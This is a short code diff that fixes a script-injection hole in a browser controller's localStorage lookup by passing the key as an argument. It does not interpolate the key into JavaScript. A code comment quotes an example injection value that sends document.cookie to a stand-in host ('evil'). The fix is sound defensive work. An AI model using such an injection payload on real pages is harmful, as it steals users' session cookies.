@@ -311,7 +311,10 @@ class BrowserController:
         if not self._page:
             return ""
         try:
-            return self._page.evaluate(f"() => localStorage.getItem('{key}')") or ""
+            # Pass the key as an evaluate() argument. Interpolating it into the
+            # JS source (pre-v31) let a quote in *key* inject script into the
+            # page — e.g. key="x'); fetch('//evil/'+document.cookie); ('".
+            return self._page.evaluate("(k) => localStorage.getItem(k)", key) or ""
         except Exception:
             return ""
 
